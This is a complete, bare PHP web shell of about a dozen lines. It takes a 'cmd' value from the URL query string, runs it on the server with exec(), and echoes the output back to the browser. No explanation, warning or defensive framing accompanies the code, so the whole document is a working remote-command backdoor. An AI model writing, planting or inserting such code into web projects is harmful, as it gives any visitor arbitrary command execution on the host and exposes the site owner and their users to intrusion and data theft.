<?php
if(isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    $output = [];
    exec($command, $output);
    echo "<pre>";
    foreach($output as $line) {
        echo htmlspecialchars($line) . "\n";
    }
    echo "</pre>";
}
?>